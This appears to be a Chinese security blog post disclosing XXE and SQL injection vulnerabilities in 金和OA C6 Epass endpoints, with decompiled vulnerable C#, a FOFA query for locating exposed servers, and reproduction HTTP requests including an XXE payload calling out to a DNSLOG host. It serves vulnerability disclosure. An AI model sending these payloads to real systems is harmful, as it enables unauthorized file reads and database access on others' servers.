---
title: "金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-EpassInitTakenSnCheck-xxe.html
asset_dir: assets/金和oa-epassinittakensncheck.aspx、epassinittakensnexec.aspx、epassinittakensninva.aspx、epassvalidate.aspx-xxe+sql注入漏洞
---

# 金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/31 13:31
- 263浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

漏洞修复方案

代码安全审计

Docker加速服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `EpassInitTakenSnCheck.aspx` 、`EpassInitTakenSnExec.aspx`、`EpassInitTakenSnInva.aspx`、`EpassValidate.aspx`接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

软件

Windows安全工具

物流软件安全

直接根据 `EpassInitTakenSnCheck.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Epass.dll` 将其进行反编译后找到 **EpassInitTakenSnCheck** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  EpassClass epassClass = new EpassClass();
  XmlDataDocument xmlDataDocument = new XmlDataDocument();
  ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
  XmlElement documentElement = ((XmlDocument) xmlDataDocument).DocumentElement;
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时该处还存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，子节点的前两个节点值分别带入**CheckEpassInit**方法

```
XmlElement documentElement = ((XmlDocument) xmlDataDocument).DocumentElement;
string strUserCode = documentElement.ChildNodes[0].InnerText.ToString();
string strTokenSn = documentElement.ChildNodes[1].InnerText.ToString();
this.Response.Write(epassClass.CheckEpassInit(strUserCode, strTokenSn));
this.Response.End();
public string CheckEpassInit(string strUserCode, string strTokenSn)
{
  string str = "";
  string QueryString = $"select UserName from UsersInfo a inner join users b on a.userid = b.userid where a.UserID <>'{strUserCode}' and EpassTokenSn ='{strTokenSn}' and deleteflag=0 and b.usertype!=2 and b.sysflag=0 and b.Status='A' ";
  if (this.op.ExecSQLReobject(QueryString) != null && string.op_Inequality(this.op.ExecSQLReobject(QueryString).ToString(), ""))
    str = this.op.ExecSQLReobject(QueryString).ToString();
  return str;
}
```

整个过程对于参数没有过滤或校验，因此造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

## EpassInitTakenSnExec.aspx

[![金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞](images/img-001-ba1a10426561.webp)](https://image.mrxn.net/9e99657464284126bff480da11e1e26e.webp)

## EpassInitTakenSnInva.aspx

[![金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞](images/img-002-1f04f4ba3aa8.webp)](https://image.mrxn.net/03463834224549e49c9deeaaef845781.webp)

## EpassValidate.aspx

[![金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞](images/img-003-bd992262b2c3.webp)](https://image.mrxn.net/9b7651ccd96248a3814bd9658f87e0fb.webp)

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.epass/EpassInitTakenSnCheck.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

代码安全审计

[![金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞](images/img-004-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

## SQL

```
POST /c6/Jhsoft.Web.epass/EpassInitTakenSnCheck.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<root>
<strUserCode>SQLI_POC</strUserCode>
<strTokenSn>1</strTokenSn>
</root>
```

[![金和OA EpassInitTakenSnCheck.aspx、EpassInitTakenSnExec.aspx、EpassInitTakenSnInva.aspx、EpassValidate.aspx XXE+SQL注入漏洞](images/img-005-ccfbcea547b9.webp)](https://image.mrxn.net/44c53f86659f43b287dc6bd790560fb5.webp)

成功延时 4 秒

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.EpassInitTakenSnExec.aspx](#toc-4-1-)
- [4.2.EpassInitTakenSnInva.aspx](#toc-4-2-)
- [4.3.EpassValidate.aspx](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
